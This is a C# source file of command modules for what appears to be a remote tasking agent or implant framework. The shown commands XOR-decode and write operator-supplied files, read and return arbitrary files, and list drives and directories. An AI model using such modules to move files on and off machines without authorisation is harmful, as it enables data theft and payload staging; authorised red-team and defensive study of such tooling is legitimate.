using System;
using System.IO;
using System.Text;
using Dots.Models;

namespace FileSystem
{
    public class Program { public static void Main(string[] args) { } }

    public class UploadCommand : DotsCommand
    {
        public override string Name => "upload";

        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
        {
            byte[] upstream_data = Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]);
            string upload_path = task.Params[2];
            File.WriteAllBytes(upload_path, upstream_data);
            SetupResult(task, "Wrote " + upstream_data.Length.ToString() + " bytes to: " + upload_path);
        }
    }

    public class DownloadCommand : DotsCommand
    {
        public override string Name => "download";

        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
        {
            string download_path = task.Params[0];
            SetupResult(task, File.ReadAllBytes(download_path));
        }
    }

    public class DrivesCommand : DotsCommand
    {
        public override string Name => "drives";

        private static string Drives()
        {
            StringBuilder result = new StringBuilder();

            try
            {
                foreach (DriveInfo objDrive in DriveInfo.GetDrives())
                {
                    result.AppendLine($"Drive {objDrive.Name}");
                    result.AppendLine($"Volume Label: {objDrive.VolumeLabel}");
                    result.AppendLine($"{objDrive.DriveFormat} drive");
                    result.AppendLine($"Total size: {Math.Round(objDrive.TotalSize / 1000000000.0, 2)} GB");
                    result.AppendLine($"Free space: {Math.Round(objDrive.TotalFreeSpace / 1000000000.0, 2)} GB");
                    result.AppendLine();
                }
            }
            catch (Exception ex)
            {
                result.AppendLine(ex.ToString());
            }

            return result.ToString();
        }

        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
        {
            SetupResult(task, Drives());
        }
    }

    public class DirCommand : DotsCommand
    {
        public override string Name => "dir";

        public override void Execute(TaskRequest task, DotsProperties dotsProperty)  
        {
            SetupResult(task, Dir(task.Params));
        }

        private static string Dir(string[] args)
        {
            StringBuilder result = new StringBuilder();
            string directory = Directory.GetCurrentDirectory();
            if (args.Length > 0)
            {
                directory = args[0];
            }
            if (!Directory.Exists(directory))
            {
                throw new DirectoryNotFoundException($"Directory not found: {args[0]}");
            }

            result.AppendLine($" Directory of {directory}");

            string[] directories = Directory.GetDirectories(directory);
            foreach (string dir in directories)
            {
                DirectoryInfo dirInfo = new DirectoryInfo(dir);
                string date = dirInfo.LastWriteTime.ToString("MM/dd/yyyy  hh:mm tt");
                result.AppendLine($"{date}    <DIR>          {dirInfo.Name}");
            }

            string[] files = Directory.GetFiles(directory);
            foreach (string file in files)
            {
                FileInfo fileInfo = new FileInfo(file);
                string date = fileInfo.LastWriteTime.ToString("MM/dd/yyyy  hh:mm tt");
                result.AppendLine($"{date}    {fileInfo.Length,15:N0} {fileInfo.Name}");
            }

            return result.ToString();
        }
    }
}
